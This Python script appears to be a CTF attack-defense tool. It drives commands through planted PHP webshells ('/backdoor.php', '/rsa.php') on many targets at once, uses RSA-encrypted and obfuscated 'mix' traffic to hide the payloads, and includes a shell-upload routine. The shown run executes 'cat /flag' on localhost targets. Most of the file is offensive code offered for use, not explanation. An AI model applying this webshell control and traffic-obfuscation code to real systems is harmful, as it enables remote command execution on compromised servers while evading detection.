#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import base64

from common import logger, rsa_encrypt, rsa_decrypt, callback_default
from config import FLAG_PATTERN
from mix import NormalRequest, MixRequest
from exps import *


def test_rsa():
    """测试 RSA Agent
    """
    logger.info("[+] Start Test RSA...")
    text = 'test'+'asdveaw' * 10
    logger.debug("Origin Text : %s" % text)
    text = rsa_encrypt(text)
    logger.debug("RSA Encrypt : %s" % text)
    text = rsa_decrypt(text)
    logger.debug("RSA Decrypt : %s" % text)


def attack_by_normal_request(targets, shell, passwd, payload, threads=10, callback=None):
    """普通攻击封装
    """
    logger.info("[+] Init Normal Request...")
    if not passwd and not isinstance(payload, dict):
        req = NormalRequest(shell, passwd, payload, targets)
    else:
        req = NormalRequest(shell, passwd, payload, targets)
    if not callback:
        req.callback.append(callback_default)
    else:
        req.callback.append(callback)
    req.start(threads)


def attack_by_mix_request(targets, shell, passwd, payload, threads=10, callback=None):
    """混淆流量攻击封装
    """
    logger.info("[+] Init Mix Request...")
    if not passwd and not isinstance(payload, dict):
        req = MixRequest(shell, passwd, payload, targets)
    else:
        req = MixRequest(shell, passwd, payload, targets)
    if not callback:
        req.callback.append(callback_default)
    else:
        req.callback.append(callback)
    req.start(threads)


def test_normal(targets, payload):
    """测试 Normal
    """
    logger.info("[+] Start Test [Normal]...")
    attack_by_normal_request(targets, "/backdoor.php", "1", payload, 1)


def test_normal_rsa(targets, payload):
    """测试 Normal + RSA
    """
    logger.info("[+] Start Test [RSA + Normal]...")
    payload = rsa_encrypt(payload)
    attack_by_normal_request(targets, "/rsa.php", 0, payload, 1)


def test_mix(targets, payload):
    """测试 Mix
    """
    logger.info("[+] Start Test [Mix]...")
    attack_by_mix_request(targets, "/backdoor.php", "1", payload,  1)


def test_mix_rsa(targets, payload):
    """测试 Mix + RSA
    """
    logger.info("[+] Start Test [RSA + Mix]...")
    payload = rsa_encrypt(payload)
    attack_by_mix_request(targets, "/rsa.php", 0, payload, 1)


def attack_upload_shell():
    targets = ['127.0.0.1:8085']
    payload = exp_upload_shell_rsa_abs()
    req = NormalRequest("backdoor.php", "1", payload, targets)
    req.callback = callback_default
    req.start(1)


if __name__ == '__main__':
    logger.info("[+] Testing...")
    # targets = ['127.0.0.1:8085']
    targets = ['127.0.0.1:8085' for i in range(10)]
    payload = exp_system('cat /flag')
    # logger.toggleDebug()
    # test_rsa()
    # test_normal(targets, payload)
    # test_normal_rsa(targets, payload)
    # test_mix(targets, payload)
    test_mix_rsa(targets, payload)
    # logger.toggleDebug()
